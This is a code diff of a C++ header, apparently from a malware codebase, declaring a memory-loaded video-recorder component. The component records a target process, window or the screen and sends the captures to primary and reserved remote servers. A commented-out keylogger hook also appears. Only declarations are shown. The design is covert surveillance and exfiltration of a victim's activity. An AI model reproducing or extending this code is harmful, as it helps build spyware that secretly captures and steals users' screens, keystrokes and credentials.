@@ -43,8 +43,6 @@ private:
 	typedef VOID (WINAPI *TResetTimer	)();
 
 	typedef VOID (WINAPI *TStartSend	)( char* uid, char* path, const char* ip1, int port1, const char* ip2, int port2 );
-	typedef VOID (WINAPI *TStartFindFields)();
-	typedef VOID (WINAPI *TStopFindFields)();
 	//
 	//
 	HMEMORYMODULE FHandle;
@@ -60,8 +58,6 @@ public:
 	TStopRec          Stop;
 	TResetTimer       ResetTimer;
 	TStartSend        SendData;
-	TStartFindFields  StartFindFields;
-	TStopFindFields   StopFindFields;
 };
 
 
@@ -88,23 +84,64 @@ public:
 	void RecordProcess(DWORD PID);
 	void RecordCurrentProcess();
 	void RecordWnd(HWND Wnd);
+	void RecordScreen();
+	void ResetTimer();
+	void SendFiles(const char *Path);
+	void Stop();
 };
 
 
 
-
-void StartRecordThread(DWORD pid, PCHAR KeyWord, PCHAR ip, PCHAR ReservedIP, int port);//стартуем поток записи видео
-void StartRecordThread1(HWND hWnd,PCHAR KeyWord,PCHAR ip, PCHAR ReservedIP, int port);//стартуем поток записи видео
-void StopRecordThread();//останавливаем поток записи видео
-void VideoRecorderSendPath(PCHAR Path,PCHAR ip, PCHAR ReservedIP, int port);//подгружаем длл и вызываем из нее ф-цию
-
-//шлем либо просто либо передавая функцию в поток, параметр для которого директория
-void StartFindFields();
-DWORD WINAPI StartSendinThread(LPVOID Data);
-
 //Функция возвращает адрес сервера для записи видео
 PCHAR GetVideoRecHost1();
 PCHAR GetVideoRecHost2();
+
+
+
+
+namespace VideoRecorder
+{
+	//------------------------------------------------------------
+	// RecordProcess - Функция запускает асинхронную видеозапись
+	// указанного процесса.
+	//
+	// PID - Идентификатор указанного процесса. Если 0, то будет
+	//       вестись запись текущего процесса
+	//
+	// VideoName - имя видеозаписи
+	//------------------------------------------------------------
+	void RecordProcess(DWORD PID, const char* VideoName);
+
+
+	//------------------------------------------------------------
+	// RecordWnd - Функция запускает ассинхронную запись видео с
+	// указанного окна
+	//
+	// Wnd - Идентификатор окна
+	// VideoName - Имя записи
+	//------------------------------------------------------------
+    void RecordWnd(HWND Wnd, const char* VideoName);
+
+	//------------------------------------------------------------
+	//  Функция остонавливает запись
+	//------------------------------------------------------------
+	void Stop();
+
+	//------------------------------------------------------------
+	//  VideoRecorderSendFiles - Функция отправляет файлы из
+	//  указанной папки на сервер видеозаписи.
+	//  Настройки берутся глобальные.
+	//------------------------------------------------------------
+	void SendFiles(PCHAR Path);
+	void SendFiles(string const &Path);
+}
+
+
+
+//??????????????????????????????????????????
+//шлем либо просто либо передавая функцию в поток, параметр для которого директория
+DWORD WINAPI StartSendinThread(LPVOID Data);
+
 
 //void WINAPI IEURLChanged(PKeyLogger Logger, DWORD EventID, LPVOID Data);
 
